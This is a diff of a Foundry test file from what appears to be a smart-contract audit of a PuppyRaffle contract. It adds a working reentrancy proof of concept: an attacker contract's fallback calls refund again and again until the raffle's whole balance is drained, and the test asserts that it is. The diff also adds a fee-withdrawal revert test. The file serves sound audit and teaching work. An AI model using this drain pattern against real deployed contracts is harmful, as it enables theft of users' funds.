@@ -4,6 +4,7 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import "forge-std/console.sol";
+import "forge-std/Vm.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
 contract AuditRaffle is Test {
@@ -193,15 +194,67 @@ contract AuditRaffle is Test {
     }
 
     function testRenetrancyRefundFunc() public {
+        address[] memory players = new address[](4);
+        players[0] = address(test1);
+        players[1] = address(test2);
+        players[2] = address(test3);
+        players[3] = address(owner);
+        raffle.enterRaffle{value : 4e18}(players);
 
+    AttackContract attacker = new AttackContract(address(raffle));
+    vm.deal(address(attacker), 1e18);
+    uint256 startingAttackerBalance = address(attacker).balance;
+    console.log(startingAttackerBalance);
+    uint256 startingContractBalance = address(raffle).balance;
+    console.log(startingContractBalance);
+    attacker.attack();
+
+    uint256 endingAttackerBalance = address(attacker).balance;
+    console.log(endingAttackerBalance);
+    uint256 endingContractBalance = address(raffle).balance;
+    console.log(endingContractBalance);
+    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
+    assertEq(endingContractBalance, 0);
+    }
+
+    function testWithdrawFeeshouldFAil() public {
+        address[] memory players = new address[](20);
+        for (uint i = 0; i < 20; i++) {
+            players[i] = address(i);
+        }
+        raffle.enterRaffle{value: 20e18}(players);
+
+        vm.expectRevert();
+        raffle.withdrawFees();
     }
 
 }
 
 contract AttackContract {
-    PuppyRaffle puppy;
+    PuppyRaffle immutable i_puppy;
     uint256 entranceFee;
     uint256 indexattacker;
 
+    constructor(address raffle) {
+        i_puppy = PuppyRaffle(raffle);
+    }
 
+    function withdraw() public {
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+        require(success);
+    }
+
+    function attack() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        i_puppy.enterRaffle{value : 1e18}(players);
+        indexattacker  =  i_puppy.getActivePlayerIndex(address(this));
+        i_puppy.refund(indexattacker);
+    }
+
+    fallback() external payable {
+        if (address(i_puppy).balance > 0) {
+            i_puppy.refund(indexattacker);
+        }
+    }
 }
